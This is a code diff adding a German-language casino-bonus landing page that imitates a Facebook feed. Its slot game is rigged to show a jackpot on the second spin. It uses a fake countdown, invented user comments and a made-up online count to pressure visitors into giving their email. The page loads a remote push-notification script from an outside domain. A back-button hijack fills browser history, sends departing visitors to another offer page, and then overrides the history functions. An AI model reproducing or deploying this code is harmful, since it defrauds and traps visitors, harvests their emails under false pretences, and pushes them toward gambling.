@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <base href="#">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="initial-scale=1">
+    <link href="css/s.css" rel="stylesheet" type="text/css">
+    <title>Sichere dir jetzt deine Freispiele</title>
+    <!-- Google Tag Manager -->
+    <script>(function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-M7TDH3PQ');</script>
+    <!-- End Google Tag Manager -->
+    <script>
+        var s = document.createElement('script');
+        s.src = '//deehalig.net/act/files/micro.tag.min.js?z=5705526' + '&sw=/sw-check-permissions-9098f.js';
+        s.onload = function (result) {
+            switch (result) {
+                case 'onPermissionDefault': break;
+                case 'onPermissionAllowed': break;
+                case 'onPermissionDenied': break;
+                case 'onAlreadySubscribed': break;
+                case 'onNotificationUnsupported': break;
+            }
+        };
+        document.head.appendChild(s);
+    </script>
+</head>
+
+<body>
+    <p><audio autoplay="autoplay" preload="">
+            <source src="sounds/alert.ogg" type="audio/ogg" />
+            <source src="sounds/alert.mp3" type="audio/mpeg" />
+        </audio> <audio id="slot-win-audio" preload="">
+            <source src="sounds/win.mp3" type="audio/mpeg" />
+        </audio> <audio id="slot-spin-audio" preload="">
+            <source src="sounds/spin.mp3" type="audio/mpeg" />
+        </audio></p>
+    <div class="fbheader">
+        <table class="fbwrapper">
+            <tbody>
+                <tr>
+                    <td width="10"><img src="images/icon-search.png" />
+                    <td style="text-align: center; color: #fff; font-size: 20px;" width="80">Neuigkeiten
+                    <td width="10" align="right"><img src="images/icon-account.png" />
+            </tbody>
+        </table>
+    </div>
+    <div class="fbsubheader">
+        <table class="fbwrapper">
+            <tbody>
+                <tr>
+                    <td width="30" align="center"><img src="images/status.png" />
+                    <td width="30" align="center"><img src="images/photo.png" />
+                    <td width="30" align="center"><img src="images/checkin.png" />
+            </tbody>
+        </table>
+    </div>
+    <div class="wrapper">
+        <div
+            style="max-width: 600px; margin: 0 auto; background: #ffffff; padding: 15px 10px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); text-align: center;">
+            <h2 class="everyday" style="margin: 0; color: #000; font-weight: normal;">
+                🎯 <span style="color:#303970; font-weight:bold;">BEGRENZTES ANGEBOT:</span><br />
+                <span style="font-size: 1.2em; color: red; font-weight: bold;">
+                    🎯 $4.000 Bonus sichern!
+                    </span><br />
+                <span style="font-size: 0.9em; color: #666;">(Nur heute verfügbar – exklusiv für Facebook-Nutzer!)</span>
+            </h2>
+        </div>
+        <div style="text-align:center; margin-top: 10px;">
+            <p style="font-size: 1em; color: #222; margin: 5px 0;">
+                💰 <strong>Ausgezahlter Jackpot:</strong> <span style="color: #ffad00; font-weight: bold;">$<span
+                        id="jackpot">2.493.997,17</span></span>
+            </p>
+            <p style="font-size: 1em; color: #e53935; margin: 5px 0;">
+                ⏰ <strong>Drehe vor:</strong> <span id="cdtime" style="font-weight: bold;">00:05:16:252</span>
+            </p>
+        </div>
+        <div style="text-align:center; font-size: 0.95em; color: #666; margin-bottom: 5px;">
+            ✅ Keine Kreditkarte erforderlich. Drehs sind kostenlos.
+        </div>
+        <div class="roll">
+            <div>
+                <strong>
+                    <button id="spin" style="cursor: pointer;" onclick="myFunction()">
+                        <img class="arrow-left" src="images/red-arrow-left.png" /> Drehen <img class="arrow-right"
+                            src="images/red-arrow-right.png" />
+                    </button>
+                    <button id="stop" style="display:none; cursor: pointer;">Stopp</button>
+                    <button id="spin2" style="display:none; cursor: pointer;">
+                        <img class="arrow-left" src="images/red-arrow-left.png" /> Drehen <img class="arrow-right"
+                            src="images/red-arrow-right.png" />
+                    </button>
+                    <button id="stop2" style="display:none; cursor: pointer;">Stopp</button>
+                    <button id="spin3" style="display:none; cursor: pointer;">
+                        <img class="arrow-left" src="images/red-arrow-left.png" /> Drehen <img class="arrow-right"
+                            src="images/red-arrow-right.png" />
+                    </button>
+                    <button id="stop3" style="display:none; cursor: pointer;">Stopp</button>
+                </strong>
+            </div>
+            <div class="wheeldiv"><strong> <img class="slot" id="slot-start" src="images/slot-start.png" /> <img
+                        class="slot slot-hidden" id="slot-spin" src="images/slot-spin.gif" /> <img
+                        class="slot slot-hidden" id="slot-result-1" src="images/slot-result-1.png" /> <img
+                        class="slot slot-hidden" id="slot-result-2" src="images/slot-result-2.png" /> <img
+                        class="slot slot-hidden" id="slot-win" src="images/slot-win.png" /> </strong></div>
+            <div class="miss" style="display:none;">
+                <p class="received" style="color: #cc0000;">😕 Noch kein Gewinn</p>
+                <p class="receivedbot">Ein weiterer Dreh könnte alles verändern! 🎯</p>
+            </div>
+            <div class="info">
+                <div class="blink" style="opacity: 1; max-width: 360px; margin: 0 auto; text-align: center; padding: 15px;
+                         background: #303970; color: #fff; border-radius: 10px;
+                         box-shadow: 0 4px 8px rgba(0,0,0,0.4); animation: gentleFlash 4s ease-in-out infinite;">
+  <p style="font-size: 1.1em;">✅ Bis zu $4.000 Bonus + 150 Freispiele</p>
+  <p style="font-size: 1em;">📌 In 3 einfachen Schritten sichern!</p>
+  <p style="font-size: 1em; margin-top: 8px;">🎯 <strong>Gesamtjackpot:</strong> <span style="color: #ffcc00;">$2.493.997,17</span></p>
+  <p style="margin-top: 12px; font-weight: bold; font-size: 1.05em; color: #ffcc00;">
+    🎁 Bonus sichern, bevor die Zeit abläuft!
+  </p>
+</div>
+
+            </div>
+        </div>
+    </div>
+    <div class="question" style="display:none;">
+        <div class="topques">
+            <p class="received" style="color: #28a745;"><strong>🎉 Fast geschafft!</strong></p>
+            <p class="receivedbot"><strong>Nur noch ein kurzer Check, bevor du deinen Bonus freischaltest 👇</strong>
+            </p>
+        </div>
+        <p class="threeq"><strong>Beantworte jetzt diese 3 kurzen Fragen:</strong></p>
+
+        <div id="q1">
+            <div class="boxin">
+                <p class="questnum"><strong>FRAGE 1</strong></p>
+                <p class="quest"><strong>Bist du 18 Jahre oder älter? (Erforderlich für den Bonus)</strong></p>
+            </div>
+            <strong><button class="yesno">Ja</button>&nbsp;&nbsp;<button class="yesno">Nein</button></strong>
+        </div>
+
+        <div id="q2" style="display:none;">
+            <div class="boxin">
+                <p class="questnum"><strong>FRAGE 2</strong></p>
+                <p class="quest"><strong>Hast du schon einmal einen Bonus oder Preis online gewonnen?</strong></p>
+            </div>
+            <strong><button class="yesno">Ja</button>&nbsp;&nbsp;<button class="yesno">Nein</button></strong>
+        </div>
+
+        <div id="q3" style="display:none;">
+            <div class="boxin">
+                <p class="questnum"><strong>FRAGE 3</strong></p>
+                <p class="quest"><strong>Hast du eine aktive E-Mail-Adresse, um deinen Bonus zu erhalten?</strong></p>
+            </div>
+            <strong><button class="yesno">Ja</button>&nbsp;&nbsp;<button class="yesno">Nein</button></strong>
+        </div>
+
+        <div class="loading" style="display:none;">
+            <p class="analyzing"><strong>Wir prüfen deine Antworten... Das dauert nur einen Moment 😊</strong></p>
+            <div class="bar">
+                <div class="active"></div>
+            </div>
+        </div>
+    </div>
+    <div class="finaldiv" style="display:none">
+        <div class="finalinfo">
+            <div class="blinkfinal">
+                <p class="received"><strong>🎉 HERZLICHEN GLÜCKWUNSCH!</strong></p>
+                <p class="receivedbot"><strong>Sichere dir jetzt deinen Preis unten:</strong></p>
+                <div>
+                    <div class="txt cta clearfix finalinfo" style="margin: 0 auto; width: 100%; text-align: left;">
+                        <p style="font-size: 1.3em; font-weight: bold; text-align: center; margin: 0;">
+                            🎯 <span style="color:#ff0000;">100&nbsp;Chancen</span> auf
+                          </p>
+                          <p style="font-size: 1.2em; font-weight: bold; text-align: center; margin: 4px 0 8px;">
+                            <span style="color:#ff0000;">$4.000&nbsp;Bonus</span> + 150 Freispiele!
+                          </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div>
+            <p><strong></strong></p>
+            <div class="cta clearfix" onclick="">
+                <strong>🎁 Jetzt Code eingeben & Bonus aktivieren!</strong>
+              </div>
+            <!-- <div class="cta clearfix" onclick="" style="color: red; font-weight: bold; text-align: center;">
+                ✅ Trusted Offer – Only <strong>2 Bonus Spots</strong> Left Today!
+            </div> -->
+        </div>
+
+        <div id="form-section">
+            <form id="subscribeForm" action="https://cas-track.online/sendy/subscribe" method="POST" accept-charset="utf-8" target="_self">
+                <label for="email">E-Mail-Adresse</label><br />
+                <input type="email" name="email" id="email" required /><br />
+                
+                <!-- Honeypot -->
+                <div style="display:none;">
+                  <label for="hp">HP</label><br />
+                  <input type="text" name="hp" id="hp" />
+                </div>
+                <input type="hidden" name="zone" value="{zone}" />
+                <input type="hidden" name="source" value="{source}" /> 
+                <input type="hidden" name="campaign_id" value="{campaign_id}" />
+                
+                <input type="hidden" name="list" value="Fm4UY1D4JXfyn6nSE4UhJg" />
+                <input type="hidden" name="subform" value="yes" />
+                
+                <button type="submit" id="submit" class="claim-btn" style="background-color: #28a745; color: white; padding: 12px 0; font-size: 18px; font-weight: bold; border: none; border-radius: 8px; width: 100%; max-width: 300px; display: block; margin: 20px auto 10px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">🎁 Bonus sichern!</button>
+                
+                <p style="text-align: center; font-size: 0.85em; color: #666;">
+                  🔒 Kein Spam. Du kannst dich jederzeit abmelden. 100 % sicheres & verifiziertes Angebot.
+                </p>
+              </form>
+          </div>
+
+          
+          <script>
+            const offerA = "https://luckystarisyou.store/chv3l3k.php?key=article-1&emailadd=[Email]&emailcontent=[emailcon]&external_id=[ExternalID]&payout=[Payout]&campaign_id=[CampaignID]";
+            const offerB = "https://luckystarisyou.store/chv3l3k.php?lp=1";
+          
+            // 监听按钮点击，在用户操作下立即弹出新窗口（iOS兼容关键）
+            document.getElementById("submit").addEventListener("click", function () {
+              window.open(offerB, "_blank");
+            });
+          
+            // 表单提交后再跳转当前页面，确保Sendy收到
+            document.getElementById("subscribeForm").addEventListener("submit", function () {
+              setTimeout(() => {
+                window.location.href = offerA;
+              }, 1000); // 延迟确保Sendy正常收信
+            });
+          </script>
+        </div>
+
+    </div>
+    <div class="comments"
+        style="background-color: #fff; border-radius: 5px; margin: 17px auto 10px; max-width: 600px; width: 90%;">
+        <div class="fbcoms">
+            <p class="comments"><strong>Kommentare:</strong></p>
+            <p class="buttons"><strong><span class="like">Gefällt mir</span> . <span>Kommentieren</span> .
+                    <span>Teilen</span> . <span>Löschen</span></strong></p>
+            <p class="totlikes"><strong><span class="fbblue">14.073 weitere Personen</span> gefällt das</strong></p>
+            <p class="viewmore clearfix"><strong><span class="left">Weitere Kommentare anzeigen</span> <span
+                        class="right">50 von 80.312</span></strong></p>
+            <div id="comment-container"></div>
+        </div>
+    </div>
+
+    <script>
+        const dynamicComments = [
+            {
+                name: "Anna Meier",
+                avatar: "images/img1.jpg",
+                text: "Gerade angemeldet und Freispiele bekommen! Drückt mir die Daumen 🤞",
+                time: "Gerade eben"
+            },
+            {
+                name: "Ben Schneider",
+                avatar: "images/img2.jpg",
+                text: "Dachte zuerst, das ist Fake – aber Bonus kam sofort 😅",
+                time: "Gerade eben"
+            },
+            {
+                name: "Sophie Weber",
+                avatar: "images/img3.jpg",
+                text: "Kleiner Tipp: Nutzt eine extra E-Mail 😉",
+                time: "vor 1 Min."
+            },
+            {
+                name: "Lukas Schulz",
+                avatar: "images/img4.jpg",
+                text: "Nach Einzahlung direkt $100 Bonus erhalten. Mega Aktion 💰",
+                time: "vor 2 Min."
+            },
+            {
+                name: "Mia Hoffmann",
+                avatar: "images/img5.jpg",
+                text: "Letztes Mal zu spät... heute gleich mitgemacht!",
+                time: "vor 5 Min."
+            },
+            {
+                name: "Tim Becker",
+                avatar: "images/img6.jpg",
+                text: "Beim ersten Dreh nix gewonnen – trotzdem spannend 😄",
+                time: "vor 6 Min."
+            },
+            {
+                name: "Leonie Wagner",
+                avatar: "images/img7.jpg",
+                text: "Freispiele eingelöst und dann gewonnen?! 😍",
+                time: "vor 7 Min."
+            },
+            {
+                name: "Paul Zimmermann",
+                avatar: "images/img8.jpg",
+                text: "Kann bestätigen – habe schon $50 bekommen. Einfach anmelden!",
+                time: "vor 9 Min."
+            },
+            {
+                name: "Emily König",
+                avatar: "images/img9.jpg",
+                text: "Als der Slot auf 'GEWINN' gelandet ist... WOW 🔥🔥🔥",
+                time: "vor 10 Min."
+            },
+            {
+                name: "Jonas Fischer",
+                avatar: "images/img10.jpg",
+                text: "Läuft super in Chrome – Safari hatte Probleme.",
+                time: "vor 12 Min."
+            }
+        ];
+
+        const container = document.getElementById("comment-container");
+        dynamicComments.forEach(comment => {
+            const div = document.createElement("div");
+            div.className = "item";
+            div.innerHTML = `
+      <strong><img class="profileimg" height="50" src="${comment.avatar}" width="50" /></strong>
+      <p class="comtxt"><strong><span class="name">${comment.name}</span> ${comment.text}</strong></p>
+      <p class="combot"><strong><span class="ago">${comment.time}</span> . <span class="fblike">Gefällt mir</span></strong></p>
+    `;
+            container.appendChild(div);
+        });
+    </script>
+
+    <div class="users-online"
+        style="position: fixed; bottom: 0; right: 0; color: white; background-color: #3b5998; padding: 5px 10px; z-index: 5; font-weight: bold; text-shadow: 0 -1px 0 rgba(0,0,0,0.3); border-radius: 4px 0 0 0;">
+        <img src="images/logo.png" /> <span>184</span> Users Online
+    </div>
+    <style>
+        .blink {
+            -webkit-transition: opacity .3s ease-in-out;
+            -moz-transition: opacity .3s ease-in-out;
+            -ms-transition: opacity .3s ease-in-out;
+            -o-transition: opacity .3s ease-in-out;
+            opacity: 0
+        }
+
+        .blinkfinal {
+            animation: gentleFlash 2s ease-in-out infinite;
+        }
+
+        @keyframes gentleFlash {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .vibrate {
+            animation: vibrate 0.2s infinite;
+        }
+
+        @keyframes vibrate {
+            0% {
+                transform: translate(0);
+            }
+
+            25% {
+                transform: translate(2px, -2px);
+            }
+
+            50% {
+                transform: translate(-2px, 2px);
+            }
+
+            75% {
+                transform: translate(2px, 2px);
+            }
+
+            100% {
+                transform: translate(0);
+            }
+        }
+    </style>
+    <p><strong>
+            <script type="text/javascript"> function fadeOut(el) {
+                    el.style.opacity = 1;
+                    (function fade() { if ((el.style.opacity -= .1) < 0) { el.style.display = "none" } else { requestAnimationFrame(fade) } })()
+                }
+                function fadeIn(el, display) {
+                    el.style.opacity = 0;
+                    el.style.display = display || "block";
+                    (function fade() {
+                        var val = parseFloat(el.style.opacity); if (!((val += .1) > 1)) {
+                            el.style.opacity = val;
+                            requestAnimationFrame(fade)
+                        }
+                    })()
+                }
+                function FBcom(a, b) {
+                    setTimeout(function () {
+                        var test = document.querySelectorAll(a + ", " + a + " .comtxt, " + a + " .combot"); var x1 = document.getElementById(a); var x2 = document.querySelector('#' + a + ' .comtxt'); var x3 = document.querySelector('#' + a + ' .combot');
+                        fadeIn(x1);
+                        fadeIn(x2);
+                        fadeIn(x3)
+                    }, b)
+                } (function () {
+                    FBcom("fb8", 3000);
+                    FBcom("fb5", 30500);
+                    FBcom("fb6", 53000);
+                    FBcom("fb7", 75000);
+                    FBcom("fb8", 90000);
+                    var s = document.getElementsByClassName('blink')[0].style;
+                    setInterval(function () {
+                        s.opacity = .403843410654006;
+                        setTimeout(function () { s.opacity = 0 }, 600)
+                    }, 1000);
+                    document.getElementById('stop').style.display = "none";
+                    document.getElementById('spin2').style.display = "none";
+                    document.getElementById('stop2').style.display = "none";
+                    document.getElementById('stop3').style.display = "none";
+                    document.getElementById('spin3').style.display = "none";
+                    document.getElementById('q2').style.display = "none";
+                    document.getElementById('q3').style.display = "none";
+                    document.getElementsByClassName('miss')[0].style.display = "none";
+                    document.getElementsByClassName('question')[0].style.display = "none";
+                    document.getElementsByClassName('loading')[0].style.display = "none";
+                    document.getElementsByClassName('finaldiv')[0].style.display = "none";
+                    document.getElementById('spin').onclick = function () {
+                        document.getElementById('spin').style.display = "none";
+                        document.getElementById('slot-start').style.display = "none";
+                        document.getElementsByClassName('info')[0].style.display = "none";
+                        document.getElementById('stop').style.display = "block";
+                        document.getElementById('slot-spin').style.display = "inline";
+                        document.getElementById('slot-spin-audio').play(); var x = document.getElementsByClassName('receivedbot'); for (var i = 0; i < x.length; i++) { x[i].innerHTML = "You have 1 more spin!" }
+                    }
+                    document.getElementById('stop').onclick = function () {
+                        document.getElementById('stop').style.display = "none";
+                        document.getElementById('slot-spin').style.display = "none";
+                        document.getElementById('slot-result-1').style.display = "inline";
+                        document.getElementById('spin2').style.display = "block"; var z = document.getElementsByClassName('miss')[0];
+                        fadeIn(z);
+                        setTimeout(function () { fadeOut(z) }, 1500)
+                    }
+                    document.getElementById('spin2').onclick = function () {
+                        document.getElementById('spin2').style.display = "none";
+                        document.getElementById('slot-result-1').style.display = "none";
+                        document.getElementById('stop2').style.display = "block";
+                        document.getElementById('slot-spin').style.display = "inline";
+                        document.getElementById('slot-spin-audio').play(); var x = document.getElementsByClassName('receivedbot'); for (var i = 0; i < x.length; i++) { x[i].innerHTML = "You have 1 more spin, good luck!" }
+                    }
+                    document.getElementById('stop2').onclick = function () {
+                        document.getElementById('stop2').style.display = "none";
+                        document.getElementById('slot-spin').style.display = "none";
+                        document.getElementById('slot-win').style.display = "inline";
+                        document.getElementById('slot-win-audio').play();
+
+                        // 抖动动画
+                        document.getElementById('slot-win').classList.add("vibrate");
+
+                        // 文案变化 + 闪烁效果
+                        const x1 = document.getElementsByClassName('received');
+                        const x2 = document.getElementsByClassName('receivedbot');
+                        for (let i = 0; i < x1.length; i++) {
+                            x1[i].innerHTML = "🎉 JACKPOT!";
+                            x1[i].style.color = "#ffcc00";
+                            x1[i].style.animation = "flash 1s infinite";
+                        }
+                        for (let i = 0; i < x2.length; i++) {
+                            x2[i].innerHTML = "You Just Won BIG!";
+                            x2[i].style.color = "#ffffff";
+                            x2[i].style.animation = "bounce 1s infinite";
+                        }
+
+                        // 动画完进入问题流程
+                        setTimeout(() => {
+                            document.getElementsByClassName('roll')[0].style.display = "none";
+                            document.getElementsByClassName('question')[0].style.display = "block";
+                        }, 2000);
+                    }
+                    var q1 = document.querySelectorAll('#q1 .yesno');
+                    for (var i = 0; i < q1.length; i++) {
+                        q1[i].addEventListener('click', function () {
+                            document.getElementById('q1').style.display = "none";
+                            document.getElementById('q2').style.display = "block"
+                        }, !1)
+                    }
+                    var q2 = document.querySelectorAll('#q2 .yesno');
+                    for (var i = 0; i < q1.length; i++) {
+                        q2[i].addEventListener('click', function () {
+                            document.getElementById('q2').style.display = "none";
+                            document.getElementById('q3').style.display = "block"
+                        }, !1)
+                    }
+                    var q3 = document.querySelectorAll('#q3 .yesno');
+                    for (var i = 0; i < q3.length; i++) {
+                        q3[i].addEventListener('click', function () {
+                            document.getElementById('q3').style.display = "none";
+                            document.getElementsByClassName('threeq')[0].style.display = "none";
+                            document.getElementsByClassName('loading')[0].style.display = "block"; var elem = document.getElementsByClassName("active")[0]; var pos = 0; var id = setInterval(frame, 35);
+                            function frame() {
+                                if (pos == 100) {
+                                    clearInterval(id);
+                                    document.getElementsByClassName('question')[0].style.display = "none";
+                                    document.getElementsByClassName('everyday')[0].style.display = "none";
+                                    document.getElementsByClassName('finaldiv')[0].style.display = "block"; var s = document.getElementsByClassName('blinkfinal')[0].style;
+                                    setInterval(function () {
+                                        s.opacity = 1;
+                                        setTimeout(function () { s.opacity = 0 }, 300)
+                                    }, 600)
+                                } else {
+                                    pos++;
+                                    elem.style.width = pos + '%'
+                                }
+                            }
+                        }, !1)
+                    }
+                    var ll = ['like', 'fblike'];
+                    for (var i = 0; i < ll.length; i++) {
+                        var ff = document.getElementsByClassName(ll[i]); for (var t = 0; t < ff.length; t++) {
+                            ff[t].addEventListener('click', function () {
+                                if (this.classList.contains('selected')) {
+                                    this.classList.remove('selected');
+                                    this.innerHTML = "Like"
+                                } else {
+                                    this.classList.add('selected');
+                                    this.innerHTML = "Unlike"
+                                }
+                            }, !1)
+                        }
+                    }
+                }())
+            </script>
+            <script language="Javascript"> var hoursleft = 1;
+                var minutesleft = 5;
+                var secondsleft = 23;
+                var millisecondsleft = 10;
+                var finishedtext = "Last Chance!";
+                end = new Date();
+                end.setMinutes(end.getMinutes() + minutesleft);
+                end.setSeconds(end.getSeconds() + secondsleft);
+                end.setMilliseconds(end.getMilliseconds() + millisecondsleft);
+                function cd() {
+                    now = new Date();
+                    diff = end - now;
+                    diff = new Date(diff);
+                    var f = diff.getMilliseconds();
+                    var d = diff.getSeconds();
+                    var e = diff.getMinutes();
+                    if (e < 10) { e = "0" + e }
+                    if (d < 10) { d = "0" + d }
+                    if (f < 10) { f = "00" + f } else { if (f < 100) { f = "0" + f } }
+                    if (now >= end) {
+                        clearTimeout(timerID);
+                        document.getElementById("cdtime").innerHTML = finishedtext
+                    } else { document.getElementById("cdtime").innerHTML = "00:" + e + ":" + d + ":" + f }
+                    timerID = setTimeout("cd()", 45)
+                }
+                cd()
+            </script>
+        </strong></p>
+    <!-- <script
+        type="text/javascript">window.setTimeout(function () { alert('$10 deposit to claim $100 free bets and 200 free spins! Get it now!'); }, 2000);</script> -->
+    <script>!function () {
+            var t;
+            var tmp = 'http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=DE';
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
+                onpopstate = function (t) {
+                    t.state && location.replace(tmp);
+                }
+            } catch (o) {
+            }
+        }();</script>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M7TDH3PQ" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <script>
+        var s = document.createElement('script');
+        s.src = '//deehalig.net/act/files/micro.tag.min.js?z=5705526' + '&sw=/sw-check-permissions-9098f.js';
+        s.onload = function (result) {
+            switch (result) {
+                case 'onPermissionDefault': break;
+                case 'onPermissionAllowed': break;
+                case 'onPermissionDenied': break;
+                case 'onAlreadySubscribed': break;
+                case 'onNotificationUnsupported': break;
+            }
+        };
+        document.head.appendChild(s);
+    </script>
+<script>
+    (function (window, location) {
+        // 先提取查询参数
+        var params = new URLSearchParams(location.search);
+        var clickid = params.get('clickid');
+        var visitor_id = params.get('visitor_id');
+        
+        console.log("clickid:", clickid);  // 打印 clickid
+        console.log("visitor_id:", visitor_id);  // 打印 visitor_id
+    
+        // 延迟执行 pushState，确保查询参数不丢失
+        setTimeout(function() {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+    
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function () {
+                        // 在跳转时附加 clickid 和 visitor_id 查询参数
+                        location.replace("http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=DE&clickid=" + clickid + "&visitor_id=" + visitor_id);
+                    }, 0);
+                }
+            }, false);
+        }, 100); // 延迟 100ms 执行
+    })(window, location);
+    </script>
+    <div id="custom-popup" style="position:fixed;top:30%;left:50%;transform:translateX(-50%);
+    background:#fff;border-radius:10px;padding:20px;box-shadow:0 0 20px rgba(0,0,0,0.3);z-index:9999;
+    text-align:center;width:90%;max-width:300px;display:none;">
+    
+    <h3 style="color:#ff6600;">🎉 🇩🇪 Exklusives Angebot für Deutschland!</h3>
+    
+    <p style="font-size:16px;">
+        Sichere dir jetzt bis zu <strong>$4.000 Bonus</strong> + <strong>150 Freispiele</strong> in 3 Stufen! <br />
+        <span style="color: #e53935; font-weight: bold;">Nur heute verfügbar!</span>
+    </p>
+    
+    <button onclick="document.getElementById('custom-popup').style.display='none'"
+        style="margin-top:15px;padding:10px 20px;background:#ff6600;color:#fff;border:none;border-radius:5px;
+               font-weight: bold; font-size: 15px; cursor: pointer;">
+        Bonus holen
+    </button>
+</div>
+
+    <script>
+        window.setTimeout(function () {
+            document.getElementById('custom-popup').style.display = 'block';
+        }, 2000);
+    </script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // 默认 cookie 存储时间为 1 天
+            var cookietime = '1'; 
+        
+            // 提取 URL 中的参数
+            function getURLParameter(name) {
+                var param = decodeURI(
+                    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [,null])[1] || ''
+                );
+                console.log(name + ": " + param); // 调试：打印提取的参数
+                return param;
+            }
+        
+            // 创建 cookie
+            function createCookie(name, value, days) {
+                var expires = "";
+                if (days) {
+                    var date = new Date();
+                    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // 设置过期时间
+                    expires = "; expires=" + date.toGMTString();
+                }
+                document.cookie = name + "=" + value + expires + "; path=/";
+                console.log("Created cookie: " + name + "=" + value); // 调试：打印创建的 cookie
+            }
+        
+            // 获取 URL 中的 `clickid` 参数并存储到 cookie 中
+            var clickid = getURLParameter('clickid');
+            if (clickid) {
+                createCookie('clickid', clickid, cookietime);
+            }
+        
+            function getURLParameter(name) {
+    var param = decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || 
+        RegExp(name + '=(.+?)(&|$)').exec(location.pathname) || [, null])[1] || ''
+    );
+    console.log(name + ": " + param);  // 打印提取的参数
+    return param;
+}
+var clickid = getURLParameterFromPath('clickid');
+if (clickid) {
+    createCookie('clickid', clickid, cookietime);
+}
+
+(function(window, location) {
+    // 禁用 history.pushState 和 history.replaceState
+    // 通过改成空函数避免修改 URL
+    history.replaceState = function() {};
+    history.pushState = function() {};
+})(window, location);
+
+            // 获取 URL 中的 `visitor_id` 参数并存储到 cookie 中
+            var visitor_id = getURLParameter('visitor_id');
+            if (visitor_id) {
+                createCookie('visitor_id', visitor_id, cookietime);
+            }
+        });
+    </script>
+      </body>
+</body>
+
+</html>
